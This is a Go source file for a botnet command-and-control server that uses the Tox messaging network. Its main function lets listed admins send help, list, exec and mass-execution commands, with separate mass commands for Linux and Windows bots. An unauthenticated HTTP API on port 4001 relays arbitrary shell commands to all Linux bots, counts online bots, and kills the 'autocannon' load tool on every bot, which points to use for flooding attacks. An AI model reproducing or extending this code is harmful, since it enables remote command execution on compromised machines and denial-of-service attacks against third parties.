package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"time"

	tox "github.com/TokTok/go-toxcore-c"
	"Barbatros2137/net"
)

func main() {

	net.Usage()

	var t = net.Tox_instance

	net.Bootstrap()
	net.ToxWrite()
	net.ShowC2()

	t.CallbackFriendRequest(func(t *tox.Tox, friendId string, message string, userData interface{}) {
		senderNum, err := t.FriendAddNorequest(friendId)
		if err != nil {
			fmt.Println("[-] Error: Failed to add incoming friend -", senderNum, err)
		}
		if senderNum < 100000 {
			net.ToxWrite()
		}
	}, nil)

	t.CallbackFriendMessage(func(t *tox.Tox, senderNum uint32, message string, userData interface{}) {

		senderKey, err := t.FriendGetPublicKey(senderNum)
		if err != nil {
			fmt.Println(err)
		}

		messages := strings.Fields(message)

	
		for _, admin := range net.Admins {
			if senderKey == admin[0:64] {
				if strings.ToLower(messages[0]) == "help" {
					net.AdminHelp(senderNum)
				} else if strings.ToLower(messages[0]) == "list" {
					net.AdminList(senderNum)
				} else if strings.ToLower(messages[0]) == "exec" {
					net.AdminExec(senderKey, messages)
				} else if strings.ToLower(messages[0]) == "mass" {
					net.AdminMass(senderNum, senderKey, messages)
				} else if strings.ToLower(messages[0]) == "masslinux" {
					net.AdminMassLinux(senderNum, senderKey, messages)
				} else if strings.ToLower(messages[0]) == "masswin" {
					net.AdminMassWin(senderNum, senderKey, messages)
				}
			} else {
				net.BotResponse(messages)
			}
		}
	}, nil)

	go func() {
		http.HandleFunc("/masslinux", func(w http.ResponseWriter, r *http.Request) {
			var payload struct {
				Command string `json:"command"`
			}
			if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
				http.Error(w, err.Error(), http.StatusBadRequest)
				return
			}
			dummyKey := "HTTP_API_KEY_0000000000000000000000000000000000000000000000000"
			messages := append([]string{"MASSLINUX"}, strings.Fields(payload.Command)...)
			net.AdminMassLinux(0, dummyKey, messages)
			
			w.WriteHeader(http.StatusOK)
			w.Write([]byte(`{"status":"ok"}`))
		})
		
		http.HandleFunc("/stop", func(w http.ResponseWriter, r *http.Request) {
			dummyKey := "HTTP_API_KEY_0000000000000000000000000000000000000000000000000"
			messages := []string{"MASSLINUX", "pkill", "-f", "autocannon"}
			net.AdminMassLinux(0, dummyKey, messages)
			
			w.WriteHeader(http.StatusOK)
			w.Write([]byte(`{"status":"ok"}`))
		})

		http.HandleFunc("/list", func(w http.ResponseWriter, r *http.Request) {
			friends := net.Tox_instance.SelfGetFriendList()
			count := 0
			for _, friend := range friends {
				status, _ := net.Tox_instance.FriendGetConnectionStatus(friend)
				if status != 0 {
					count++
				}
			}
			w.WriteHeader(http.StatusOK)
			w.Write([]byte(fmt.Sprintf(`{"count":%d}`, count)))
		})

		fmt.Println("[+] HTTP API listening on :4001")
		if err := http.ListenAndServe(":4001", nil); err != nil {
			fmt.Println("HTTP server error:", err)
		}
	}()
	shutdown := false
	for !shutdown {
		t.Iterate()
		time.Sleep(1000 * 50 * time.Microsecond)
	}
	t.Kill()
}
